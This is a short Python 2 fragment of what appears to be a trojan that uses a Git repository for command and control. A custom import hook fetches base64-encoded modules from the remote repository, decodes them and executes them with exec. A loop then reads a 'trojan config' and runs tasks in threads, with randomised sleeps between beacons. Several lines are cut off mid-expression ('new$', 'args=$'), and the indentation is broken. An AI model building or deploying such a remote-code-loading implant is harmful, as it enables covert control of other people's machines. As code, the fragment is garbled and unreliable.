class GitImporter(object):
        def __init__(self):
                self.current_module_code = ""

        def find_module(self,fullname,path=None):
                if configured:
                        print "[*] Attempt to retrieve %s" % fullname
                        new_library = get_file_contents("modules/%s" % fullname)

                        if new_library is not None:
                                self.current_module_code = base64.b64decode(new$
                                return self
                return None

        def load_module(self,name):
                module = imp.new_module(name)
                exec self.current_module_code in module.__dict__
                sys.modules[name] = module


                return module
        def module_runner(module):
                task_queue.put(1)
                result = sys.modules[module].run()
                task_queue.get()

                store_module_result(result)

                return

	 sys.meta_path = [GitImporter()]

	while True:
                if task_queue.empty():
                        config = get_trojan_config()
                        for task in config:
                                t = threading.Thread(target=module_runner,args=$
                                t.start()
                                time.sleep(random.randint(1,10))
                time.sleep(random.randint(1000,10000))
